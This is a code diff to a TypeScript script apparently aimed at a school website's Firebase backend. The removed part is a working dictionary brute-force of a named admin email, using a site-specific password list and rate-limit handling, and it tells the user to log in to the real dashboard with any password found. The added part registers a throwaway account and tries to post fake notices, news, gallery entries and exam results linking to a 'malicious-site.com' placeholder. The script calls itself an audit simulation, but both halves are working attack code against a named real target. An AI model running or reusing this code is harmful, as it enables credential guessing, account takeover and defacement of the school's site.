@@ -32,84 +32,117 @@ const RED = "\x1b[31m";
 const GREEN = "\x1b[32m";
 const RESET = "\x1b[0m";
 
-// --- LAST RESORT: BRUTE FORCE ADMIN PASSWORD ---
-// Since we cannot bypass rules, we must guess the Key.
-
-async function bruteForceAdmin() {
+async function simulateAdminActions() {
   console.log(`\n=========================================================`);
-  console.log(`   EXECUTE ORDER 66: BRUTE FORCE ADMIN CREDENTIALS   `);
-  console.log(`=========================================================`);
+  console.log(`   ATTEMPTING ADMIN ACTIONS (CLIENT-SIDE SIMULATION)   `);
+  console.log(`=========================================================\n`);
 
-  const targetEmail = "admin@gyanniketan.com";
+  // 1. Acquire Identity
+  const email = `fake_admin_${Date.now()}@example.com`;
+  const password = "Password123!";
+  let user;
 
-  // Top 50 Common Passwords + Project Specific Variations
-  const dictionary = [
-    "admin",
-    "admin123",
-    "password",
-    "123456",
-    "12345678",
-    "gyanniketan",
-    "gyan123",
-    "niketan123",
-    "school",
-    "school123",
-    "principal",
-    "teacher",
-    "admin@123",
-    "pass1234",
-    "qwerty",
-    "123456789",
-    "welcome",
-    "welcome123",
-    "admin@2024",
-    "admin@2023",
-    "gyanniketan123",
-    "gyanniketan@123",
-    "patna",
-    "patna123",
-  ];
-
-  console.log(`Target: ${targetEmail}`);
-  console.log(`Wordlist Size: ${dictionary.length}`);
-  console.log(`\nStarting attack... (Ctrl+C to stop)`);
-
-  for (const pass of dictionary) {
-    process.stdout.write(`Trying '${pass}'... `);
-
-    try {
-      await signInWithEmailAndPassword(auth, targetEmail, pass);
-      console.log(GREEN + ` [SUCCESS] PASSWORD FOUND: ${pass}` + RESET);
-      console.log(GREEN + `\n!!! CRITICAL VULNERABILITY FOUND !!!` + RESET);
-      console.log(`Use these credentials to log in to the real dashboard.`);
-      process.exit(0); // Found it!
-    } catch (e: any) {
-      if (
-        e.code === "auth/wrong-password" ||
-        e.code === "auth/invalid-credential" ||
-        e.code === "auth/invalid-login-credentials" ||
-        e.code === "auth/user-not-found"
-      ) {
-        console.log(RED + "[FAILED]" + RESET);
-      } else if (e.code === "auth/too-many-requests") {
-        console.log(RED + "[RATE LIMITED]" + RESET);
-        console.log("Sleeping 5s...");
-        // Simple sync delay loop
-        const start = Date.now();
-        while (Date.now() - start < 5000) {}
-      } else {
-        console.log(RED + `[ERROR: ${e.code}]` + RESET);
-      }
-    }
-
-    // Slight delay to be polite
-    const start = Date.now();
-    while (Date.now() - start < 500) {}
+  try {
+    console.log(`[1] Creating "Admin" User via Open Registration...`);
+    const cred = await createUserWithEmailAndPassword(auth, email, password);
+    user = cred.user;
+    console.log(
+      GREEN + `    SUCCESS: Created user ${email} (UID: ${user.uid})` + RESET
+    );
+  } catch (e: any) {
+    console.log(RED + `    FAILED: ${e.message}` + RESET);
+    return;
   }
 
-  console.log(`\n---------------------------------------------------------`);
-  console.log(`[FAILURE] Dictionary exhausted. Correct password not found.`);
-  console.log(`The admin account simulates a 'Strong Password' policy.`);
+  // 2. Perform Admin Tasks
+  // We attempt these exactly as the Dashboard would, to see if we can slip through.
+
+  // TASK A: Post Notice (The Main Request)
+  console.log(`\n[2] Attempting to POST NOTICE (Critical)...`);
+  try {
+    const docRef = await addDoc(collection(db, "notices"), {
+      text: "URGENT: Security Audit Test - Please Ignore",
+      link: "https://security-audit.com",
+      timestamp: serverTimestamp(),
+      // Attempting to spoof admin metadata
+      author: "admin",
+      official: true,
+    });
+    console.log(
+      GREEN +
+        `    [VULNERABLE] SUCCESS! Notice posted with ID: ${docRef.id}` +
+        RESET
+    );
+  } catch (e: any) {
+    if (e.code === "permission-denied")
+      console.log(RED + `    [SECURE] Permission Denied.` + RESET);
+    else console.log(RED + `    ERROR: ${e.message}` + RESET);
+  }
+
+  // TASK B: Post News
+  console.log(`\n[3] Attempting to POST NEWS...`);
+  try {
+    const docRef = await addDoc(collection(db, "news"), {
+      title: "Hacked News",
+      summary: "This should not appear.",
+      date: "2024-01-01",
+      category: "announcements",
+      timestamp: serverTimestamp(),
+    });
+    console.log(
+      GREEN +
+        `    [VULNERABLE] SUCCESS! News posted with ID: ${docRef.id}` +
+        RESET
+    );
+  } catch (e: any) {
+    if (e.code === "permission-denied")
+      console.log(RED + `    [SECURE] Permission Denied.` + RESET);
+    else console.log(RED + `    ERROR: ${e.message}` + RESET);
+  }
+
+  // TASK C: Post Gallery Image (Metadata only)
+  console.log(`\n[4] Attempting to POST GALLERY ENTRY...`);
+  try {
+    const docRef = await addDoc(collection(db, "gallery"), {
+      title: "Hacked Image",
+      category: "General",
+      url: "http://malicious-site.com/image.png",
+      timestamp: serverTimestamp(),
+    });
+    console.log(
+      GREEN +
+        `    [VULNERABLE] SUCCESS! Gallery entry posted with ID: ${docRef.id}` +
+        RESET
+    );
+  } catch (e: any) {
+    if (e.code === "permission-denied")
+      console.log(RED + `    [SECURE] Permission Denied.` + RESET);
+    else console.log(RED + `    ERROR: ${e.message}` + RESET);
+  }
+
+  // TASK D: Post Result
+  console.log(`\n[5] Attempting to POST RESULT...`);
+  try {
+    const docRef = await addDoc(collection(db, "results"), {
+      title: "Fake Exam Results",
+      url: "http://malicious-site.com/result.pdf",
+      timestamp: serverTimestamp(),
+    });
+    console.log(
+      GREEN +
+        `    [VULNERABLE] SUCCESS! Result posted with ID: ${docRef.id}` +
+        RESET
+    );
+  } catch (e: any) {
+    if (e.code === "permission-denied")
+      console.log(RED + `    [SECURE] Permission Denied.` + RESET);
+    else console.log(RED + `    ERROR: ${e.message}` + RESET);
+  }
+
+  console.log(`\n=========================================================`);
+  console.log(`   SIMULATION COMPLETE`);
+  console.log(`=========================================================`);
+  process.exit(0);
 }
 
-bruteForceAdmin();
+simulateAdminActions();
